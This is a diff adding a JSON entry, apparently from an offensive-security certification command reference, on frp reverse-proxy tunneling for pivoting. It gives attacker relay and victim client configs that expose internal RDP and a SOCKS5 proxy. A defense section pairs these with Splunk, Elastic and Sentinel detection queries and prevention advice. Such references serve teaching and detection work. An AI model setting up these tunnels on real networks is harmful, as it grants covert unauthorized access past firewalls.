@@ -1,0 +1,100 @@
+{
+  "id": "frp-reverse-proxy",
+  "name": "frp - Fast Reverse Proxy Tunneling",
+  "command": "frpc -c frpc.ini",
+  "description": "frp (fast reverse proxy) exposes services behind NAT/firewalls through a public relay. An attacker runs frps on an internet-reachable server and frpc on the compromised internal host; frpc dials out (egress-friendly) and the relay forwards TCP/UDP/HTTP or a SOCKS proxy back into the internal network, enabling pivoting without inbound firewall rules.",
+  "platform": "multi",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Pivoting",
+  "subcategory": "Tunneling",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "fatedier/frp",
+  "tags": [
+    "frp",
+    "tunneling",
+    "pivoting",
+    "reverse-proxy",
+    "socks",
+    "nat-traversal"
+  ],
+  "mitre": [
+    "T1572",
+    "T1090"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== SERVER (attacker VPS, public IP) frps.ini ===\n  [common]\n  bind_port = 7000\n  token = <password>\n  # run:  frps -c frps.ini\n\n=== CLIENT (compromised internal host) frpc.ini ===\n  [common]\n  server_addr = <lhost>\n  server_port = 7000\n  token = <password>\n\n  # expose internal RDP back to the VPS:\n  [rdp]\n  type = tcp\n  local_ip = 127.0.0.1\n  local_port = 3389\n  remote_port = 13389\n  # run:  frpc -c frpc.ini   -> connect to <lhost>:13389\n\n=== SOCKS PROXY INTO THE NETWORK ===\n  [socks]\n  type = tcp\n  remote_port = 11080\n  plugin = socks5\n  plugin_user = <user>\n  plugin_passwd = <password>\n  # then: proxychains through <lhost>:11080\n\n=== NEW TOML FORMAT (frp v0.52+) ===\n  # frpc.toml with serverAddr/serverPort/auth.token and [[proxies]] blocks\n\n=== ALTERNATIVES ===\n  chisel         # single-binary SOCKS over HTTP/WS\n  ligolo-ng      # TUN-based, no proxychains needed\n  ssh -R / -D    # native reverse + dynamic tunnels",
+  "examples": [
+    {
+      "label": "Run the relay server",
+      "command": "frps -c frps.ini"
+    },
+    {
+      "label": "Run the client on the victim",
+      "command": "frpc -c frpc.ini"
+    }
+  ],
+  "references": [
+    {
+      "title": "frp",
+      "url": "https://github.com/fatedier/frp"
+    },
+    {
+      "title": "MITRE T1572 - Protocol Tunneling",
+      "url": "https://attack.mitre.org/techniques/T1572/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "chisel-socks",
+      "note": "chisel is a lighter single-binary SOCKS tunnel.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ligolo-ng-pivot",
+      "note": "ligolo-ng for TUN-based pivoting without proxychains.",
+      "rel": "alternative"
+    },
+    {
+      "id": "recon-chisel-http-tunnel",
+      "note": "chisel HTTP tunnel variant.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "frpc initiates an OUTBOUND connection to the attacker's relay, so it traverses NAT and egress firewalls that block inbound. The relay then tunnels arbitrary services back in, defeating perimeter segmentation.",
+    "prerequisites": "Code execution on an internal host with outbound network access and an attacker-controlled public relay.",
+    "impact": "Persistent reverse access and SOCKS pivoting into segmented internal networks, bypassing inbound firewall controls.",
+    "detection": "[MITRE T1572] Long-lived outbound connections from a server to an unusual external IP/port (e.g. 7000); frp binary on disk; beaconing/keepalive patterns; proxied internal traffic correlating with the tunnel; TLS/plain traffic to a cheap VPS ASN.",
+    "artifacts": "Netflow showing sustained egress to a non-business IP, EDR process (frpc/frps), config files (frpc.ini/.toml with server_addr), unusual listening ports on the relay, proxy-chained lateral connections.",
+    "splunk_spl": "index=firewall direction=outbound\n| stats sum(bytes) as bytes count by src_ip, dest_ip, dest_port, bin(_time,1h)\n| where count > 100 AND dest_port!=443 AND dest_port!=80",
+    "elastic_kql": "process.name:(frpc or frps) or (network.direction:outbound and destination.port:7000)",
+    "sentinel_kql": "DeviceProcessEvents\n| where FileName in~ (\"frpc\",\"frpc.exe\",\"frps\",\"frps.exe\")\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
+    "sigma_rules": "network_frp_reverse_proxy_tunnel",
+    "prevention": "Egress filtering (allowlist destinations/ports, proxy-only outbound); block unknown binaries (app control/WDAC); detect long-lived non-web egress to cheap-VPS ASNs; network segmentation with monitored chokepoints; EDR detection of frp binaries.",
+    "sources": [
+      "fatedier/frp",
+      "https://attack.mitre.org/techniques/T1572/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "frp tunneling client/server binary execution",
+        "logic": "DeviceProcessEvents\n| where FileName in~ (\"frpc\",\"frpc.exe\",\"frps\",\"frps.exe\") or ProcessCommandLine has \"server_addr\" or ProcessCommandLine has \"frpc.toml\"\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
+        "data_source": "edr",
+        "attack": [
+          "T1572",
+          "T1090"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Legitimate frp use for remote access (rare in enterprises)",
+        "tuning": "Allowlist sanctioned remote-access tooling; alert on server-origin execution"
+      }
+    ]
+  }
+}
